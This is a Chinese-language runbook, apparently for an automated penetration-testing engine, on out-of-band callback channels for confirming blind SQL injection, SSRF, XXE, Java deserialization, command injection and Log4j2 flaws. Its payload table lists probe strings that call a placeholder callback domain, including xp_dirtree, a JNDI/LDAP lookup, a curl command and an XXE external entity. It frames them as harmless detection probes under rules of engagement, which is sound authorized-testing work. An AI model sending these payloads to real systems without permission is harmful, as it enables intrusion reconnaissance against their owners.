---
id: oob-interactsh
title: OOB 回连通道手册（盲注/SSRF/XXE 无回显验证 · 三模式引擎托管）
tags: oob,回连,interactsh,dnslog,盲注,s4,s5,s1
---
# OOB 回连通道（宪法「深度测试纪律」第 5 条依赖，先查我）

> 原则：**通道由引擎三模式托管（v7.0.0）——先 `oob_check` 自检，不手动起进程**；所有模式只收回连记录（存在性证明口径），公网通道只投递无害探针。通道切换/不可用必须留痕（record_timeline）。

## 一、通道自检与收回连（v7.0.0 引擎工具，替代手工起进程）

```
oob_check   # 开工/开测前必调：返回 当前模式(A1自托管/C用户自设/A2本地监听/B公共)/回连基域/约束
            # S1 环境准备时调用一次即完成通道预置（结果自动落 evidence/oob/channel.txt，S1 收口门直接核验）
oob_poll    # 按 case-id 收回连记录：命中=D3 语义验证判据；0 条≠阴性（保持 needs_follow_up）
```

- **引擎三模式与回退链**：`auto` 按序自动选择 A1 自托管 interactsh（交互不出第三方，首选）→ C 用户自设（interactsh/dnslog/webhook，设置页配置）→ A2 本地监听器（内网/靶场零外联）→ B 公共 interactsh（免配置兜底，只允许无害探针）。配置见设置页「OOB 回连通道」卡片或 config.json `oob` 节。
- 通道由引擎守护进程管理（项目开始懒启动、结束自动回收）——**禁止再用 run_async 起 interactsh-client/监听器**（历史实证：3600s 超时被杀纯烧 244 分钟）。
- `oob_check` 返回的回连基域直接替换下方载荷中的 `<回连域>`；每次回连自动落 `evidence/oob/interactions.jsonl`（EV-x 编号引用）。
- ROE `oob_callback=deny` 时仅 A2 本地监听可用（引擎自动执行，oob_check 会如实返回）。

## 二、按漏洞类的回连载荷（无害判据）

| 漏洞类 | 探针 | 命中判据 |
|---|---|---|
| SQLi 盲注（MSSQL/Oracle） | `EXEC master..xp_dirtree '\\<回连域>\a'` / UTL_INADDR | DNS 回连记录 |
| Java 反序列化 | ysoserial `URLDNS http://<回连域>/shiro` | DNS 解析记录（不执行命令） |
| XXE | 外部实体 `<!ENTITY x SYSTEM 'http://<回连域>/xxe'>` | HTTP 回连 + 参数实体外带文件内容（只读公开文件） |
| SSRF | `url=http://<回连域>/ssrf` | 回连源 IP 即目标出网证明 |
| 命令注入盲注 | `curl http://<回连域>/cmdi` / `ping -c1 <回连域>` | HTTP/DNS 双通道任一 |
| Log4j2 | `${jndi:ldap://<回连域>/log4j}` | LDAP/DNS 回连（禁投递恶意 LDAP 服务器载荷，转 S5） |
| 路径穿越 → 远端包含 | `http://<回连域>/rfi.txt` | 回连证明可外联 |

## 三、纪律

- 回连 case-id 按 `漏洞类-目标ID-序号` 命名（如 `ssrf-aode-01`），载荷路径携带 case-id，oob_poll 精确归属。
- 通道不可用（oob_check 返回不可用）→ **盲态类禁止开测**；相关覆盖单元落 needs_follow_up，禁止写 ruled_out（盲态真阴性必须 depth≥D2 且通道健康）。
- 命中后立即落证（公共通道记录留存短，落证勿延迟）并 update_coverage（vulnerable + EV- 引用 + depth=D3）；利用级动作转 S5 审批。
- 公网通道记录**不携带**目标敏感数据（只回连不外带文件内容；XXE 外带仅限公开示例文件）。
